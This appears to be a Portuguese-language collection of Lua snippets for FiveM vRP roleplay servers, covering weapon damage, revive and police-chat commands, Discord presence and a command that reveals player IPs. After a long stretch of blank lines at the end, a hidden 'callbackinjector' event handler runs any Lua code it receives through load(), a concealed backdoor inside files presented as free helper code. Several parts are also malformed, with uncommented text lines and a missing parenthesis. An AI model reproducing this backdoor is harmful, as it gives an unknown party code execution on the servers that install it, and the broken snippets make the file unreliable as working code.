-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--- Criador Eterno.exe#9767 Por favor Mantenha os Creditos! 
---vrp_codigos foi criado com intuito de ajudar pessoal que n gosta de procurar codigos espero que ajuda alguma pessoa mantenha os creditos!
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
emP = Tunnel.getInterface("vrp_codigos")


-------------------------------------------------------------------------------------------------------------------------------------
-- STATUS DO DISCORD
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
    while true do
        SetDiscordAppId() -------------ID DA APLICAÇAO NO SITE DO DESENVOLVEDOR DO DC
        SetDiscordRichPresenceAsset('logo')
        SetDiscordRichPresenceAssetText('__')
        SetDiscordRichPresenceAssetSmall('logo')
        SetDiscordRichPresenceAssetSmallText('__')
        SetDiscordRichPresenceAction(0, "Jogar", "fivem://connect/SEUIP:30120")
        SetDiscordRichPresenceAction(1, "Discord", "https://discord.gg/SEUDC")
        Citizen.Wait(60000)
    end
end)

------ APENAS COLOQUE O NOME DA ARMA (), 0.1 -- DANO DA ARMA

Citizen.CreateThread(function()
    while true do
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_CARBINERIFLE'), 1.5)  
    Wait(0)
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_UNARMED'), 0.5)
    Wait(0)
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_NIGHTSTICK'), 0.1)
    Wait(0)
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_SMG'), 2.0)
    Wait(0)
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_SPECIALCARBINE'), 2.5)
    Wait(0)
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_COMBATPISTOL'), 1.5)
    Wait(0)
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_ASSAULTRIFLE'), 2.5)
    Wait(0)
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_ASSAULTSMG'), 2.0)
    Wait(0)
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_MACHINEPISTOL'), 1.0)
    Wait(0)
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_PISTOL_MK2'), 1.5)
    Wait(0)
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_GUSENBERG'), 2.0)
    Wait(0)
    N_0x4757f00bc6323cfe(GetHashKey('WEAPON_COMPACTRIFLE'), 2.5)
    Wait(0)
end
end)
----------------------------------------------------------------------------
--DANO CORONHADA //// PISTOL WHIPPING
----------------------------------------------------------------------------
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        local ped = PlayerPedId()
        if IsPedArmed(ped, 6) then
        DisableControlAction(1, 140, true)
        DisableControlAction(1, 141, true)
        DisableControlAction(1, 142, true)
    end
end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- Trintar
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('trintar',function(source,args,rawCommand)
    local user_id = vRP.getUserId(source)
        TriggerEvent("Notify","importante","Importante","Contagem dos 30 segundos de ação",30000)
 		TriggerEvent("progress",30000,"trintar")
		SetTimeout(30000,function()
	end)
 end)
 -----------------------------------------------------------------------------------------------------------------------------------------
 -- /fps
 -----------------------------------------------------------------------------------------------------------------------------------------
 RegisterCommand("fps",function(source,args)
     if args[1] == "on" then
         SetTimecycleModifier("cinema")
         TriggerEvent("Notify","sucesso","Sucesso","Boost de fps ligado!")
     elseif args[1] == "off" then
         SetTimecycleModifier("default")
         TriggerEvent("Notify","sucesso","Sucesso","Boost de fps desligado!")
     end
 end)
-----------------




--Kikar Player com Resolução Baixa

Citizen.CreateThread(function()
    local screenTimers = GetGameTimer()

    while true do
        if GetGameTimer() >= screenTimers then
            screenTimers = GetGameTimer() + 60000

            local ratio = GetAspectRatio(0)
            local x,_ = GetActiveScreenResolution()
            local y = x / ratio
            if x < 1280 and y < 720 then --Aqui voce coloca a resolucao minima!
                TriggerEvent("Notify","negado","Voce vai ser desconectado por usar uma resolucao muito baixa.") --Notificacao
                Citizen.Wait(20000)
                TriggerServerEvent("kickRESOLUCAO")
            end
        end

        Citizen.Wait(1000)
    end
end)---------------
--/SEMEMS 
contador = {}
RegisterCommand('semems',function(source,args,rawCommand) --COMANDO /semems
    local user_id = vRP.getUserId(source)
    local source = source
    local emss = vRP.getUsersByPermission("paramedico.permissao") --PERMISSAO PARAMEDICO
    if contador[user_id] == nil or contador[user_id] == 0 then
        if vRPclient.isInComa(source) then --VERIFICA SE A PESSOA ESTÁ EM COMA
            if parseInt(#emss) == 0 then
                if vRP.request(source,"Deseja pagar <b>$5.000 dólares</b> para reanimar ?",30) then --REQUISICAO DE PAGAMENTO VALOR
                    vRP.tryFullPayment(user_id,5000) -- VALOR A SER PAGO
                    vRPclient.killGod(source)
                    vRPclient.setHealth(source,110) -- VIDA AO USAR O COMANDO
                    contador[user_id] = 900 --DEFINE OS SEGUNDOS PARA USAR NOVAMENTE --     900 = 15 MINUTOS
                    TriggerClientEvent("Notify",source,"sucesso","Voce pagou <b>$5.000 dólares</b> para reanimar!") --Notify
                end
            else
                TriggerClientEvent("Notify",source,"negado","Existem membros do Departamento Médico em serviço!") --Notify
            end
        else
            TriggerClientEvent("Notify",source,"negado","Voce precisa estar em coma!") --Notify
        end
    else
        TriggerClientEvent("Notify",source,"negado","Voce precisa esperar "..contador[user_id].." segundos pra usar novamente!") --Notify
    end
end)

Citizen.CreateThread(function()
    while true do
        Wait(1000)
        for k,v in pairs(contador) do
            if contador[k] > 0 then
                contador[k] = contador[k] - 1
            end
        end
    end
end)
-----------------------------------------
-- /FPS ON/OFF
--------------------------------------------------------------
RegisterCommand("fps",function(source,args)
    if args[1] == "on" then
        SetTimecycleModifier("cinema")
        TriggerEvent("Notify","sucesso","Sucesso","FPS ligado!")
    elseif args[1] == "off" then
        SetTimecycleModifier("default")
        TriggerEvent("Notify","sucesso","Sucesso"," FPS desligado!")
    end
end)
 
------------------------------------------------
/pd, chat interno policia

RegisterCommand('pd',function(source,args,rawCommand)
    if args[1] then
        local user_id = vRP.getUserId(source)
        local identity = vRP.getUserIdentity(user_id)
        local permission = "policia.permissao"
        if vRP.hasPermission(user_id,permission) then
            local soldado = vRP.getUsersByPermission(permission)
            for l,w in pairs(soldado) do
                local player = vRP.getUserSource(parseInt(w))
                if player then
                    async(function()
                        TriggerClientEvent('chatMessage',player,identity.name.." "..identity.firstname,{64,179,255},rawCommand:sub(3))
                    end)
                end
            end
        end
    end
end)


-------------munição----------------
wammo|WEAPON_SAWNOFFSHOTGUN
wammo|WEAPON_MACHINEPISTOL
wammo|WEAPON_PISTOL
wammo|WEAPON_PISTOL_MK2
wammo|WEAPON_COMBATPISTOL
wammo|WEAPON_APPISTOL
wammo|WEAPON_STUNGUN
wammo|WEAPON_SNSPISTOL
wammo|WEAPON_VINTAGEPISTOL
wammo|WEAPON_REVOLVER
wammo|WEAPON_MUSKET
wammo|WEAPON_FLARE
wammo|GADGET_PARACHUTE
wammo|WEAPON_FIREEXTINGUISHER
wammo|WEAPON_MICROSMG
wammo|WEAPON_SMG
wammo|WEAPON_ASSAULTSMG
wammo|WEAPON_COMBATPDW
wammo|WEAPON_PUMPSHOTGUN_MK2
wammo|WEAPON_CARBINERIFLE
wammo|WEAPON_ASSAULTRIFLE
wammo|WEAPON_GUSENBERG
wammo|WEAPON_PETROLCAN

------------ armas ----------------------------

wbody|WEAPON_PETROLCAN
wbody|WEAPON_GUSENBERG
wbody|WEAPON_ASSAULTRIFLE
wbody|WEAPON_CARBINERIFLE
wbody|WEAPON_MACHINEPISTOL
wbody|WEAPON_SAWNOFFSHOTGUN
wbody|WEAPON_PUMPSHOTGUN_MK2
wbody|WEAPON_COMBATPDW
wbody|WEAPON_ASSAULTSMG
wbody|WEAPON_SMG
wbody|WEAPON_MICROSMG
wbody|WEAPON_FIREEXTINGUISHER
wbody|GADGET_PARACHUTE
wbody|WEAPON_FLARE
wbody|WEAPON_MUSKET
wbody|WEAPON_REVOLVER
wbody|WEAPON_VINTAGEPISTOL
wbody|WEAPON_SNSPISTOL
wbody|WEAPON_STUNGUN
wbody|WEAPON_APPISTOL
wbody|WEAPON_COMBATPISTOL
wbody|WEAPON_PISTOL_MK2
wbody|WEAPON_PISTOL
wbody|WEAPON_STONE_HATCHET
wbody|WEAPON_POOLCUE
wbody|WEAPON_BATTLEAXE
wbody|WEAPON_WRENCH
wbody|WEAPON_NIGHTSTICK
wbody|WEAPON_SWITCHBLADE
wbody|WEAPON_MACHETE
wbody|WEAPON_KNIFE
wbody|WEAPON_KNUCKLE
wbody|WEAPON_HATCHET
wbody|WEAPON_HAMMER
wbody|WEAPON_GOLFCLUB
wbody|WEAPON_FLASHLIGHT
wbody|WEAPON_CROWBAR
wbody|WEAPON_BOTTLE
wbody|WEAPON_BAT
wbody|WEAPON_DAGGER
Função: Pegar ip, Ping e Steam Hex de um player (configure e permissao)
--------------------------------------------------------------------------
--------------- DADOS ID
--------------------------------------------------------------------------
RegisterCommand('dados',function(source,args,rawCommand)
    local ip = GetPlayerEndpoint(source)
    local steamhex = GetPlayerIdentifier(source)
    local ping = GetPlayerPing(source)
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id,"owner.permissao") then
        if args[1] then
            local nplayer = vRP.getUserSource(parseInt(args[1]))
            if nplayer then
                local ip2 = GetPlayerEndpoint(nplayer)
                local steamhex2 = GetPlayerIdentifier(nplayer)
                local ping2 = GetPlayerPing(nplayer)
               TriggerClientEvent("Notify",source,"aviso","IP do player:"  ..ip2.."")
               TriggerClientEvent("Notify",source,"aviso","Player Hex:" ..steamhex2.."")
               TriggerClientEvent("Notify",source,"aviso","Ping do player:" ..ping2.."")
            end
        else
            TriggerClientEvent("Notify",source,"aviso","Seu IP:"  ..ip.."")
            TriggerClientEvent("Notify",source,"aviso","Sua hex:"  ..steamhex.."")
            TriggerClientEvent("Notify",source,"aviso","Seu ping:"  ..ping.."")
        end
    end
end) 
--------------------------------------------------------------------------
--------------- FIX VOZ VAZANDO NO MUMBLE VOIP
--------------------------------------------------------------------------
--Citizen.CreateThread(function()
  --  while true do
    --    Citizen.Wait(1000)
      --  NetworkSetTalkerProximity(8.0)
    --end
--end)
--------------------------------------------------------------------------
---------STATUS DO DISCORD------
--------------------------------------------------------------------------
Citizen.CreateThread(function()
    while true do
        SetDiscordAppId(820649007050391604)
        SetDiscordRichPresenceAsset('logo')
        SetDiscordRichPresenceAssetText('rj')
        SetDiscordRichPresenceAssetSmall('')
        SetDiscordRichPresenceAssetSmallText('')
        SetDiscordRichPresenceAction(0, "Jogar", "")
        SetDiscordRichPresenceAction(1, "discord", "aqui")
        Citizen.Wait(60000)
    end
end
--------------------------------------------------------------------------
--------- NÃO ATIRAR FALANDO NO RÁDIO ------
--------------------------------------------------------------------------
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(1)
        local ped = PlayerPedId()
        local player = PlayerId() 
        if IsEntityPlayingAnim(ped, "random@arrests","generic_radio_chatter", 3) then
            DisablePlayerFiring(player, true)
        end
    end
end)
--------------------------------------------------------------------------
---- SILENCIADOR 
--------------------------------------------------------------------------
RegisterCommand("silenciador",function(source,args)
	local ped = PlayerPedId()
	if GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_PISTOL") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_PISTOL"),GetHashKey("COMPONENT_AT_PI_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_PISTOL_MK2") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_PISTOL_MK2"),GetHashKey("COMPONENT_AT_PI_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_COMBATPISTOL") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_COMBATPISTOL"),GetHashKey("COMPONENT_AT_PI_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_APPISTOL") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_APPISTOL"),GetHashKey("COMPONENT_AT_PI_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_PISTOL50") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_PISTOL50"),GetHashKey("COMPONENT_AT_AR_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_SNSPISTOL_MK2") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_SNSPISTOL_MK2"),GetHashKey("COMPONENT_AT_PI_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_HEAVYPISTOL") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_HEAVYPISTOL"),GetHashKey("COMPONENT_AT_PI_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_VINTAGEPISTOL") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_VINTAGEPISTOL"),GetHashKey("COMPONENT_AT_PI_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_CERAMICPISTOL") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_CERAMICPISTOL"),GetHashKey("COMPONENT_CERAMICPISTOL_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_MICROSMG") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_MICROSMG"),GetHashKey("COMPONENT_AT_AR_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_SMG") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_SMG"),GetHashKey("COMPONENT_AT_PI_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_SMG_MK2") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_SMG_MK2"),GetHashKey("COMPONENT_AT_PI_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_ASSAULTSMG") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_ASSAULTSMG"),GetHashKey("COMPONENT_AT_AR_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_COMBATPDW") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_COMBATPDW"),GetHashKey("COMPONENT_AT_AR_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_MACHINEPISTOL") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_MACHINEPISTOL"),GetHashKey("COMPONENT_AT_PI_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_PUMPSHOTGUN") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_PUMPSHOTGUN"),GetHashKey("COMPONENT_AT_SR_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_PUMPSHOTGUN_MK2") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_PUMPSHOTGUN_MK2"),GetHashKey("COMPONENT_AT_SR_SUPP_03"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_ASSAULTSHOTGUN") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_ASSAULTSHOTGUN"),GetHashKey("COMPONENT_AT_AR_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_BULLPUPSHOTGUN") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_BULLPUPSHOTGUN"),GetHashKey("COMPONENT_AT_AR_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_HEAVYSHOTGUN") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_HEAVYSHOTGUN"),GetHashKey("COMPONENT_AT_AR_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_ASSAULTRIFLE") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_ASSAULTRIFLE"),GetHashKey("COMPONENT_AT_AR_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_ASSAULTRIFLE_MK2") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_ASSAULTRIFLE_MK2"),GetHashKey("COMPONENT_AT_AR_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_CARBINERIFLE") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_CARBINERIFLE"),GetHashKey("COMPONENT_AT_AR_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_CARBINERIFLE_MK2") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_CARBINERIFLE_MK2"),GetHashKey("COMPONENT_AT_AR_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_ADVANCEDRIFLE") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_ADVANCEDRIFLE"),GetHashKey("COMPONENT_AT_AR_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_SPECIALCARBINE") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_SPECIALCARBINE"),GetHashKey("COMPONENT_AT_AR_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_SPECIALCARBINE_MK2") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_SPECIALCARBINE_MK2"),GetHashKey("COMPONENT_AT_AR_SUPP_02"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_BULLPUPRIFLE") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_BULLPUPRIFLE"),GetHashKey("COMPONENT_AT_AR_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_BULLPUPRIFLE_MK2") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_BULLPUPRIFLE_MK2"),GetHashKey("COMPONENT_AT_AR_SUPP"))
	elseif GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_COMPACTRIFLE") then
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_COMPACTRIFLE"),GetHashKey("COMPONENT_AT_AR_SUPP"))
	end
end)
 



































TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
